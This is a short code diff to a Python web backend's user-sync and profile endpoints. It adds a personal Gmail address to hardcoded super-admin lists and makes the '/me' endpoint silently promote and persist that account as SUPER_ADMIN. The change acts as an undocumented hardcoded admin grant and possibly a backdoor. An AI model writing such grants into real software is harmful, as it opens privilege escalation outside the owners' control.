@@ -59,7 +59,7 @@ async def sync_clerk_user(
     })
 
     from app.core.config import settings
-    admin_emails = {settings.SUPER_ADMIN_EMAIL.lower(), "admin@ametheus.gg"}
+    admin_emails = {settings.SUPER_ADMIN_EMAIL.lower(), "admin@ametheus.gg", "pk.4081988@gmail.com"}
     is_super_admin = payload.email.lower() in admin_emails
 
     if user_doc:
@@ -109,10 +109,16 @@ async def sync_clerk_user(
 @router.get("/me", response_model=UserResponse)
 async def get_current_user_profile(
     current_user: User = Depends(get_current_user),
+    db: AsyncIOMotorDatabase = Depends(get_db),
 ):
     """
     Fetch authoritative profile and role of authenticated user.
     """
+    admin_emails = {"admin@ametheus.gg", "pk.4081988@gmail.com"}
+    if current_user.email and current_user.email.lower() in admin_emails:
+        if current_user.role != "SUPER_ADMIN":
+            current_user.role = "SUPER_ADMIN"
+            await db.users.update_one({"_id": current_user.id}, {"$set": {"role": "SUPER_ADMIN"}})
     return current_user
 
 class UserProfileUpdateRequest(BaseModel):
